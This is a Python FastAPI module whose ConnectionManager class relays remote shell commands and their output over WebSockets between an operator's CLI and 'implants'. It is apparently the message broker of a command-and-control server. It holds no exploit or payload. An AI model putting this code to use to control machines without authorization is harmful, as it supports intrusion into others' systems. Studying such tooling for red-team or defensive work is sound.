from fastapi import WebSocket
from typing import Dict, List

class ConnectionManager:
    """
    Manages active WebSocket connections for remote shell sessions.
    It brokers communication between an operator's CLI and an implant.
    """
    def __init__(self):
        # Maps an implant_id to the active WebSocket connection for that implant
        self.implant_connections: Dict[str, WebSocket] = {}
        # Maps an implant_id to the operator's WebSocket connection
        self.operator_connections: Dict[str, WebSocket] = {}

    async def connect_implant(self, websocket: WebSocket, implant_id: str):
        await websocket.accept()
        self.implant_connections[implant_id] = websocket

    async def connect_operator(self, websocket: WebSocket, implant_id: str):
        await websocket.accept()
        self.operator_connections[implant_id] = websocket

    def disconnect_implant(self, implant_id: str):
        if implant_id in self.implant_connections:
            del self.implant_connections[implant_id]

    def disconnect_operator(self, implant_id: str):
        if implant_id in self.operator_connections:
            del self.operator_connections[implant_id]

    async def send_to_implant(self, message: str, implant_id: str):
        """Send a message (command) from the operator to the implant."""
        if implant_id in self.implant_connections:
            await self.implant_connections[implant_id].send_text(message)

    async def send_to_operator(self, message: str, implant_id: str):
        """Send a message (output) from the implant to the operator."""
        if implant_id in self.operator_connections:
            await self.operator_connections[implant_id].send_text(message)

# Create a single instance of the manager to be used by the API
manager = ConnectionManager()
